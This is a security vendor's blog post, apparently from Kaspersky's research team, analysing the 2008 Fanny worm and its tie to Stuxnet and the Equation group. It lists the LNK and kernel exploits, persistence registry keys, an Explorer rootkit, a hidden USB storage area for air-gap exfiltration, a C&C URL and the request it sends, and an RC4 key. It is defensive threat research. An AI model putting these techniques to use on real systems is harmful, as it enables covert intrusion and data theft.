    "plain_text": "# am your father, Stuxnet”\n\n###### By GReAT on February 17, 2015. 9:00 am\n\nAt the Virus Bulletin conference in 2010, researchers from Kaspersky Lab\n\npartnered with Microsoft to present findings related to Stuxnet. The joint\n\npresentation included slides dealing with various parts of Stuxnet, such as\n\nthe zero-days used in the attack.\n\nPerhaps the most interesting zero-day exploit from Stuxnet was the LNK\n\nexploit (CVE-2010-2568). This allowed Stuxnet to propagate through USB\n\ndrives and infect even machines that had Autorun disabled.\n\nIt was discovered during the 2010 research into Stuxnet that the LNK\n\nexploit has earlier been used in another malware, supposedly a Zlob PE,\n\nthat pointed to “fanny.bmp“.\n\nBack in 2010, very few people paid much attention to a piece of malware\n\nthat used the LNK exploit prior to Stuxnet. Zlob is a large malware family\n\nand these kinds of crimeware-grade samples are rarely of interest to\n\nresearchers digging into zero-days and nation-state sponsored\n\noperations.\n\n[However, during our 2014 research into the Equation group, we created a](https://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/)\n\nspecial detection for the group’s exploitation library, codenamed “PrivLib”.\n\nTo our surprise, this detection triggered a worm from 2008 that used the\n\nStuxnet LNK exploit to replicate, codenamed Fanny.\n\n## What’s so Fanny?\n\nThis PrivLib-boosted Worm, which spreads using the Stuxnet LNK exploit\n\nand the filename “fanny.bmp” was compiled on Mon Jul 28 11:11:35 2008,\n\nif we are to trust the compilation timestamp. It arrived in our December\n\n2008 collection from the wild, so the compilation might very well be\n\ncorrect.\n\n\n-----\n\nThe 2008 “Fanny.bmp” Worm is detected by Kaspersky Lab products as\n\nTrojan-Downloader.Win32.Agent.bjqt. The malware includes the LNK\n\nexploit, which means that it is a piece of malicious software that used the\n\nStuxnet LNK exploit before Stuxnet!\n\n## The second Stuxnet exploit (MS09-025)\n\nIf one piece of malicious software that used an exploit from Stuxnet\n\nbefore Stuxnet is a good catch, a second Stuxnet exploit makes it even\n\nmore interesting.\n\nThe second exploit used to be a zero-day when Fanny was operational.\n\nThis means that Fanny used two zero-days to replicate, both of which\n\nwere later used by Stuxnet. The specific vulnerability used for privilege\n\nescalation was patched with MS09-025:\n\n_“The security update addresses these vulnerabilities by correcting_\n\n_the methods used for validating a change in specific kernel_\n\n_objects, for validating the input passed from user mode to the_\n\n_kernel, and for validating the argument passed to the system call._\n\n_The security update also addresses a vulnerability by ensuring that_\n\n_the Windows kernel cleans up pointers under error conditions.”_\n\nThe same exploit was later used in an early Stuxnet module from 2009,\n\nwhich was embedded into a large binary built using the Flame platform.\n\nThat Stuxnet module, also known as “atmpsvcn.ocx” or Resource 207 was\n\nthe technical link between Stuxnet and Flame. This story has previously\n\n[been covered in our post.](http://securelist.com/blog/incidents/33174/back-to-stuxnet-the-missing-link-64/)\n\n#### #Fanny used two zero-days to replicate, both of which\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fa-fanny-equation-i-am-your-father-stuxnet%2F68787%2F&text=%23Fanny+used+two+zero-days+to+replicate%2C+both+of+which+were+later+used+by+%23Stuxnet+%23EquationAPT+%23TheSAS2015) were later used by\n\n#### #Stuxnet #EquationAPT #TheSAS2015\n\nWhile the vulnerability exploited by both the Stuxnet/Flame module and\n\nFanny is the same, the implementation of the exploit is different. The\n\nexploit in Stuxnet targets a specific OS version, while Fanny is designed to\n\nbe universal and is capable of running on multiple platforms. It has a\n\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fa-fanny-equation-i-am-your-father-stuxnet%2F68787%2F&text=%23Fanny+used+two+zero-days+to+replicate%2C+both+of+which+were+later+used+by+%23Stuxnet+%23EquationAPT+%23TheSAS2015)\n\n\n-----\n\nWindows 2000\n\nWindows XP\n\nWindows 2003\n\nWindows Vista, 2008 and possibly others from NT6.x family\n\nThe implementation of the exploit in Fanny is more complex than in\n\nStuxnet: instead of running just one payload the authors created a\n\nframework to run as many payloads as they want by replacing a system\n\nservice call dispatcher nt!NtShutdownSystem with their own custom\n\npointer from theuser-space as shown in the next figure.\n\n_Fanny injected its own system service call dispatcher_\n\nThis enables a persistent trampoline from user-mode to kernel-mode.\n\nThis feature was not present in the Stuxnet module but there are other\n\nsimilarities. For instance, it seems that both the developers of Stuxnet and\n\nof Fanny follow certain coding guidelines such as the usage of unique\n\nmagic numbers from each function call. Most of the returned results are\n\nsimply disposed but they are still part of the code. This could be the\n\nremains of a debug version of the code which could potentially log every\n\nstep in the code to ease the tracking down of an error while testing. In\n\ncomplex systems where kernel and user-space code is running with no\n\ninteraction this seems a logical and even essential method. Again, it’s\n\nimplemented both in the Stuxnet code and in Fanny. See next figure.\n\n\n-----\n\n_Stuxnet (on the left) and Fanny (on the right) using magic return values_\n\n## The Fanny Malware\n\nSo, what is Fanny essentially? It is a USB Worm with a sophisticated\n\nbackdoor that uses the so-called “Stuxnet LNK vulnerability” to\n\nautomatically execute from the USB drive even if Autorun has been\n\ndisabled. It can elevate privileges to the local System using kernel exploit\n\nand drops and registers additional modules. It attempts to connect to a\n\nC&C server and deploys additional components if connection is available.\n\nIf not, it uses the USB drive as a carrier to send/receive requests to and\n\nfrom the operator via a hidden storage area created in raw FAT structure.\n\n\n-----\n\nTypically a victim plugs in a new USB drive and opens it with Windows\n\nExplorer. You can visually observe the two stages of infection from the\n\nUSB which take seconds to execute.\n\n\n-----\n\n## Fanny modules\n\nMD5 0a209ac0de4ac033f31d6ba9191a8f7a\n\nSize 184320\n\nType Win32 DLL\n\nInternal name dll_installer.dll\n\nCompiled 2008.07.28 08:11:35 (GMT)\n\n\n-----\n\ncontains a xor-encrypted config in binary resource with number 101. The\n\nconfig determines malware behavior: there is a command to deploy\n\nmalware on the current system, URLs for the C&C server and local\n\nfilenames and paths used to install embedded malware components.\n\n_Fanny components inside the main executable_\n\nUpon starting it checks the following mutexes:\n\nGlobal\\RPCMutex\n\nGlobal\\RPCMutex\n\nWhere is a 1-byte long integer taken from the config. If any of these\n\nmutexes exist, the code doesn’t run. It means that another instance of the\n\nsame code is running. InstanceNum most likely identifies a variant or\n\ngeneration of Fanny preventing the same version from reinfecting the\n\nsystem but allowing for different versions to run (possibly to enable\n\nenforced update of components).\n\nThe module also checks another important byte in its configuration. This\n\nbyte is a counter that is decreased during successful system infection.\n\nWhen the counter reaches a minimal value of one the module cleans up\n\nthe USB drive and stops spreading the worm. In this way the attackers\n\nlimit the maximum length of the Worm’s killchain.\n\nIf the module is named “fanny.bmp” (the file name that Fanny uses to\n\nspread via USB drives) the module self-installs from the USB drive.\n\n\n-----\n\nprivileges if the user has no administrative rights on the current system. It\n\nuses a vulnerability patched by MS09-025 for that purpose. Only if the\n\nelevation succeeds does the malware attempt to connect to the C&C\n\nserver using a URL which is stored in the config:\n\nhttp://webuysupplystore[.]mooo[.]com/ads/QueryRecord200586_f2\n\nahx.html\n\nBelow is a sample request issued by the malware:\n\n\nGET /ads/QueryRecord200586_f2ahx.html HTTP/1.1\n\nUser-Agent: Mozilla/4.0 (compatible;)\n\nHost: webuysupplystore.mooo.com\n\n\nThe malware expects the C&C server to reply with an HTTP 200 response\n\nand append a 0x7f-xored string that has a second stage URL. The second\n\nstage response may contain an executable file body which is saved on\n\ndisk and executed.\n\nThe C&C server is currently sinkholed by Kaspersky Lab, but according to\n\nour pDNS records it previously pointed to the following IP address:\n\n210.81.22.239\n\n## IP information\n\nThe following describes the stages that were identified during the analysis\n\nof the initial and embedded components of Fanny.\n\n## Infection\n\nThe module searches for fanny.bmp in the root of disk drives starting\n\nfrom drive D: and copies it to the following locations:\n\n%WINDIR%\\system32\\comhost.dll\n\n%WINDIR%\\system32\\mscorwin.dll\n\n\n-----\n\ndifference between these two files. Fanny patches its config in the\n\nresource section of one of the files (comhost.dll). The patched data is the\n\nvalue of remained maximum length of the Fanny killchain. “mscorwin.dll”\n\nis the original file copied as-is from the removable drive. So far, one copy\n\nis used for infecting other USB drives, the other is loaded on the system\n\nboot.\n\nIt also copies all *.lnk files from the USB drive to “%WINDIR%\\system32\\”\n\nin order to reuse them when infecting other attached USB drives. Note\n\nthat there may be more than one LNK file, because each LNK contains a\n\ndistinct path to the DLL which gets loaded. As far as the letter of a new\n\ndrive on the target system is unknown, Fanny uses several LNKs for the\n\nmost common drive letters. This method was improved later in Stuxnet,\n\nwhich used a relative DeviceID-dependent path to the USB drive.\n\nHowever, even that method required several LNK files (up to four)\n\nbecause of different relative paths on different versions of Windows, but\n\nthat’s far fewer than an almost full set of letters from the Latin alphabet.\n\n## Persistence\n\nFanny creates the following registry value to achieve persistence:\n\nHKLM\\System\\CurrentControlSet\\Control\\MediaResources\\acm\\ECELP\n\n4\\Driver.\n\nThis is not a common way to make code start automatically on a system\n\nboot and it’s extremely invasive, but it guarantees that the module is\n\nloaded in the address space of each process in the system, including\n\nsome critical processes such as lsass.exe and services.exe running as\n\nSYSTEM user.\n\nWhen the module is loaded it checks other values that start from “filter” in\n\nthe same registry key i e :\n\n\n-----\n\nELP4\\filter2\n\nHKLM\\System\\CurrentControlSet\\Control\\MediaResources\\acm\\EC\n\nELP4\\filter3\n\nHKLM\\System\\CurrentControlSet\\Control\\MediaResources\\acm\\EC\n\nELP4\\filter8\n\nThe values contain a hosting process name and a path to a DLL or EXE file.\n\nIf the current process name contains the value set as hosting process,\n\nthen the module loads a DLL or starts a new process (in case of EXE file)\n\ndepending on target file extension.\n\nThis is a map of the processes and modules that are used in Fanny:\n\nShort\nProcess Fanny module\n\nDescription\n\n\nUSB\nwinlogon c:\\windows\\MSAgent\\AGENTCPD.DLL\n\nbackdoor\n\nWindows\n\n\nexplorer c:\\windows\\system32\\shelldoc.dll\n\n\nExplorer\n\nrootkit\n\n\nlsass c:\\windows\\system32\\mscorwin.dll USB worm\n\n## USB Worm\n\nThe code of the actual Worm is part of %WINDIR%\\system32\\comhost.dll\n\nexport with ordinal 4 (name of export is “dll_installer_4“). The DLL is a\n\nmodified next-generation Worm which is copied to every attached USB\n\ndrive with all related LNK files stored in Windows\\System32 directory. This\n\nmodule is distributed by mscorwin.dll which is part of the lsass system\n\nprocess.\n\n## Windows Explorer Rootkit\n\nThe rootkit functionality is provided by a shelldoc.dll file loaded in the\n\nWindows Explorer process. It hides some Fanny-related files (LNK-files\n\nand fanny.bmp) in Windows Explorer by removing them from the list of\n\nitems in the foreground window that uses SysListView32 control\n\n(normally Windows Explorer window).\n\nSome screenshots with disappearing files were demonstrated previously,\n\nhowever sometimes this approach may raise suspicions. Here is what it\n\nlooks like if the user opens a system32 directory with Explorer:\n\n\n-----\n\n_Seven Fanny-related file icons disappeared in Windows Explorer_\n\nApparently, it looks as if some of the file icons were cut off. In addition\n\nsome of standard directories seem to be missing due to a bug in the\n\nrootkit code. It appears as if this component was not tested properly by\n\nthe authors.\n\n## Masquerade Mode On\n\nThere is an interesting part of the code in USB Backdoor DLL which at first\n\nglance doesn’t make much sense. It takes some hardcoded constants and\n\ngenerates a random value which is saved to a registry key.\n\n_Fanny generates random values that are saved to the registry_\n\nThen it moves the current executable which is hosting the DLL to\n\nc:\\windows\\system32\\msdtc32.exe. After that the executable path is\n\nappended to HKLM\\Software\\Microsoft\\Windows\n\nNT\\CurrentVersion\\Winlogon\\Shell registry value which makes this\n\nexecutable run on system boot.\n\n\n-----\n\n#### behavior of traditional malware was used to avoid revealing further secret activities #Fanny\n\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fa-fanny-equation-i-am-your-father-stuxnet%2F68787%2F&text=The+trick+to+mimic+the+behavior+of+traditional+malware+was+used+to+avoid+revealing+further+secret+activities+%23Fanny)\n\n\nThis may look like a traditional way for malware to add itself to autostart,\n\nbut don’t be fooled by that. The purpose of this move is to make certain\n\nautomated systems and software, such as those based on sandboxes and\n\nemulators, believe that they have caught some known malware and not\n\nto let it run further. It seems that the component is so unique that the\n\nauthors decided to avoid the risk of looking even more suspect. It might\n\nseem a paradox, but the authors prefer this code to be detected as\n\nmalware if someone is checking it. The trick is to mimic the behavior of\n\nsome traditional cybercriminal malware, a bot, and get detected as soon\n\nas possible, thereby not revealing any further secret activities.\n\nConsidering that this component was spreading via USB drives and could\n\npop up on many systems, discovering it as a traditional bot would put it in\n\nlower risk zone and as a result the malware would probably end up being\n\ndeleted without proper analysis.\n\nThis might explain why this code was detected as a variant of Zlob\n\nmalware in the past and no one paid proper attention to it.\n\n## USB Backdoor\n\nOne of the modules, agentcpd.dll, is a backdoor that was designed to\n\nwork as an advanced reconnaissance tool for air-gapped computers that\n\nare normally used in highly secure facilities. The backdoor waits for a USB\n\ndrive to be plugged in and if that’s a new disk, it instantly allocates some\n\nspace for a hidden container using its own FAT16/FAT32 filesystem driver.\n\nThis is what the FAT root directory looks like before and after plugging a\n\nUSB drive into an infected machine:\n\n_Hexdump of raw disk partition before and after plugging into an infected_\n\n\n-----\n\n(corresponding hex bytes are underlined with green). It is followed by a\n\nsingle byte flag value (0x08 in hex) which, according to Microsoft, means\n\nATTR_VOLUME_ID. Each entry in this root directory table is 32-bytes\n\nlong.\n\nSubdirectory entries such as Pictures, Music, Documents and Work\n\noccupy 63 bytes, because of the long filename FAT feature. There are two\n\nvariants of subdirectory names – short and long. A subdirectory entry\n\nuses a flag 0x10 following the short directory name, which, according to\n\nMicrosoft, means ATTR_DIRECTORY.\n\nThe last record inserted by Fanny (highlighted in red) uses an invalid\n\ndirectory name and a flag 0x18, which combines ATTR_VOLUME_ID and\n\nATTR_DIRECTORY. This combination of flags is not documented\n\naccording to current FAT specifications and the whole entry is therefore\n\nignored by filesystem drivers as if it were a data corruption or a bad block.\n\nAs a result this entry is not visible in Windows, Mac OS and Linux and\n\nprobably all other implementations of FAT driver.\n\n#### It’s possible that #Fanny was used to map some of\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fa-fanny-equation-i-am-your-father-stuxnet%2F68787%2F&text=It%27s+possible+that+%23Fanny+was+used+to+map+some+of+the+future+targets+of+%23Stuxnet+%23EquationAPT+%23TheSAS2015) the future targets of\n\n#### #Stuxnet #EquationAPT #TheSAS2015\n\nWhile Fanny doesn’t rigorously protect data in hidden storage (it doesn’t\n\nmark the allocated space as bad blocks, probably to avoid attention), it\n\nchanges the filesystem driver hint value indicating where to look for the\n\nnext free cluster. In this way it reserves disk space of approximately 1Mb in\n\nsize to use for a hidden storage.\n\nWhen Fanny detects a new USB drive, with the help of its own FAT driver it\n\nlooks into the root directory and locates the entry which starts with magic\n\nvalue 51 50 40 98 (see above). It then uses the offset which follows the\n\nflag value of 0x18. On the figure above it is set to 0x001e9c00. This offset\n\non the same USB disk will have another magic value D0 CF CE CD serving\n\nas a marker for the beginning of the hidden storage:\n\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fa-fanny-equation-i-am-your-father-stuxnet%2F68787%2F&text=It%27s+possible+that+%23Fanny+was+used+to+map+some+of+the+future+targets+of+%23Stuxnet+%23EquationAPT+%23TheSAS2015)\n\n\n-----\n\n_Hexdump of Fanny hidden storage with list of running processes_\n\nOnce Fanny has allocated space for hidden storage it populates the\n\nstorage with basic information about the current system: i.e. OS Version,\n\nService Pack number, computer name, user name, company name, list of\n\nrunning processes, etc.\n\nThis secret storage is also used to pass commands to computers that are\n\nnot connected to the Internet. According to Fanny code, the container\n\nmay carry additional components and internal commands: such as to\n\ncopy certain file from the local filesystem to the USB drive (locations are\n\ndefined as parameters, the file is set hidden and system file attributes), or\n\nto update the configuration block. It uses RC4 with the following hard\ncoded key to protect critical information:\n\n18 05 39 44 AB 19 78 88 C4 13 33 27 D5 10 6C 25\n\nWhen the USB drive travels to another infected computer connected to\n\nthe Internet it can be used to carry important files and provide a way to\n\ninteract with the operator. This simple and extremely slow method of\n\ncommunication is not used by traditional cybercriminals, that is why the\n\nwhole code looks like a toolkit for professional cyberespionage. This\n\ncomponent is one of the rare malware samples from a new class of\n\nmalware called USB-Backdoors.\n\nIf you find this or a similar code of USB-Backdoor on some of your\n\nsystems this is an indicator of a professional cyberattack.\n\n## Sinkholing and victim statistics\n\nWe sinkholed the Fanny C&C server and collected victim statistics, shown\n\n\n-----\n\nAt the moment, the vast majority of victims are located in Pakistan (a\n\nwhopping 59.36%). Indonesia and Vietnam follow at great distance, with\n\n15.99% and 14.17% respectively. The infection numbers in other countries\n\nare probably too small to be relevant.\n\nOf course, this could raise the question: was Pakistan the true target of\n\nFanny? To be honest, we do not know. The current infection situation\n\nmight be different from what it was in 2008-2010. Considering that there\n\nare still over ten thousand victims worldwide, the number back in 2009\n\nmight have been much, much higher – perhaps even as high as 50,000\n\ninfections. It may be relevant that Pakistan is a top target for the Equation\n\ngroup’s other malware, along with Russia and Iran.\n\n## Conclusion\n\nWith Fanny, we begin yet another chapter in the story of Stuxnet, the\n\nEquation Group and Flame. Created in 2008, Fanny used two zero-day\n\nexploits. These two were added to Stuxnet in June 2009 and March 2010.\n\nEffectively, it means that the Equation group had access to these zero\ndays (and others) years before the Stuxnet group did.\n\nWhile the true target of Fanny remains unknown, its unique capability to\n\nmap air-gapped networks and communicate via USB sticks indicate a lot\n\nof work went into gaining the ability to access these air-gapped networks.\n\nAs a precursor for the versions of Stuxnet that could replicate through the\n\nnetwork, it’s possible that Fanny was used to map some of the future\n\ntargets of Stuxnet.\n\nAnother unusual fact is the very high number of infections coming from\n\nPakistan. Since Fanny spreads only through USB sticks, which is rather\n\nslow, this indicates that the infection began in Pakistan, possibly before\n\n\n-----\n\nunknown purpose, or was it used in preparation for Stuxnet? Perhaps time\n\nwill tell.\n\n\n[APT](https://securelist.com/all?tag=538) [CYBER ESPIONAGE](https://securelist.com/all?tag=185) [EQUATION](https://securelist.com/all?tag=663) [FLAME](https://securelist.com/all?tag=184)\n\n[SPYWARE](https://securelist.com/all?tag=143) [STUXNET](https://securelist.com/all?tag=94) [TARGETED ATTACKS](https://securelist.com/all?tag=53)\n\n### Related Posts\n\n\nShare post on:\n\n####   \n\n\n###### Happy IR in the New Year!\n\n\n###### Kaspersky Security Bulletin: Review of the Year 2017\n\n\n###### Android commercial spyware\n\n\n##### THERE ARE 4 COMMENTS\n\nredwolfe_98\n\nPosted on February 18, 2015. 1:29 pm\n\nkaspersky implies that the “equation group” and the “stuxnet group”\n\nare two different groups, but i think that another possibility is that\n\nthey are one and the same..\n\nthanks for the article.. i was wondering about the “fanny.bmp” file\n\nand how a “BMP” file was being used.. apparently it is just copied to\n\nthe harddrive, but with a different file-extension, making it usable\n\nfor malicious purposes..\n\n\n[REPLY](https://securelist.com/a-fanny-equation-i-am-your-father-stuxnet/68787/?replytocom=376065#respond)\n\n\ncyruwan\n\nPosted on March 9, 2015. 7:09 am\n\nHats off to Kaspersky engineers!!\n\n\n[REPLY](https://securelist.com/a-fanny-equation-i-am-your-father-stuxnet/68787/?replytocom=422284#respond)\n\n\n-----\n\nThe only thing U.S is worried about Pakistan is Nuclear Power (well\n\nhidden).
